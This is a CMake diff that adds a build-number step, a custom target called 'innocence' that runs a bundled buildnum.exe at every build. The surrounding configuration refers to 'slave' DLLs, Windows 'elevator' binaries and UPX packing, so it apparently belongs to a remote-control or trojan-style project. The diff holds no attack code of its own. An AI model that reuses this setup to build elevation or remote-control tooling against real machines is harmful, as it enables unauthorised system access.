@@ -63,6 +63,7 @@ message(STATUS "Runtime in : ${RUNTIME_OUTPUT_DIRECTORY}")
 message(STATUS "Modules output in : ${MODULE_OUTPUT_DIRECTORY}")
 
 # ressource generator will create headers with binary resources
+set(BUILDNUMBER "${CMAKE_SOURCE_DIR}/utils/buildnum.exe")
 set(BINGENERATOR "${CMAKE_SOURCE_DIR}/utils/bin2array.exe")
 set(COMPRESSOR "${CMAKE_SOURCE_DIR}/utils/upx.exe")
 
@@ -82,6 +83,7 @@ set(ELEVATORDLL64_HPP_PATH "${BINARY_OUTPUT}/ElevatorDll64.hpp")
 set(ELEVATORDLL64_DLL_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/x64/Release/Win7ElevateDll64.dll")
 
 message(STATUS "BINGENERATOR = ${BINGENERATOR}")
+message(STATUS "BUILDNUMBER = ${BUILDNUMBER}")
 
 message(STATUS "SLAVE_DLL_HPP_PATH = ${SLAVE_DLL_HPP_PATH}")
 message(STATUS "SLAVE_DLL_PATH = ${SLAVE_DLL_PATH}")
@@ -97,6 +99,15 @@ message(STATUS "ELEVATOR64_EXE_PATH = ${ELEVATOR64_EXE_PATH}")
 
 message(STATUS "ELEVATORDLL64_HPP_PATH = ${ELEVATORDLL64_HPP_PATH}")
 message(STATUS "ELEVATORDLL64_DLL_PATH = ${ELEVATORDLL64_DLL_PATH}")
+
+add_custom_target(
+	innocence ALL "${BUILDNUMBER}" "${CMAKE_SOURCE_DIR}/Build.hpp"
+	DEPENDS "${BUILDNUMBER}" "${CMAKE_SOURCE_DIR}/Build.hpp"
+	WORKING_DIRECTORY "${CMAKE_SOURCE_DIR}"
+	COMMENT "Execute : ${BUILDNUMBER} ${CMAKE_SOURCE_DIR}/Build.hpp"
+	VERBATIM
+	SOURCES Build.hpp Innocence.hpp
+)
 
 add_subdirectory(lib/network)
 add_subdirectory(lib/common)
